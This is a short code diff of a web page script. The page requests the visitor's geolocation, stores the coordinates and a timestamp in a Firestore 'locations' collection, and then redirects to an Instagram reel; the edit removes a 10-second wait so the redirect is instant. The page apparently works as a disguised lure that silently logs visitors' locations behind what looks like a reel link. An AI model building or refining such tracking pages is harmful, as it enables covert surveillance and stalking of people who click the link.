@@ -33,18 +33,17 @@
         `Lat: ${lat}, Lng: ${lng}`;
 
       db.collection("locations").add({
-        lat,
-        lng,
-        timestamp
-      }).then(() => {
-        // ✅ Wait 10 seconds then redirect
-        setTimeout(() => {
-          window.location.href = "https://www.instagram.com/reel/DKYwX7Izaf1";
-        }, 10000);
-      }).catch((err) => {
-        console.error("Logging failed", err);
-        window.location.href = "https://www.instagram.com/reel/DKYwX7Izaf1";
-      });
+  lat,
+  lng,
+  timestamp
+}).then(() => {
+  // ✅ Instantly redirect
+  window.location.href = "https://www.instagram.com/reel/DKYwX7Izaf1";
+}).catch((err) => {
+  console.error("Logging failed", err);
+  window.location.href = "https://www.instagram.com/reel/DKYwX7Izaf1";
+});
+
     },
     function () {
       alert("Location access denied.");
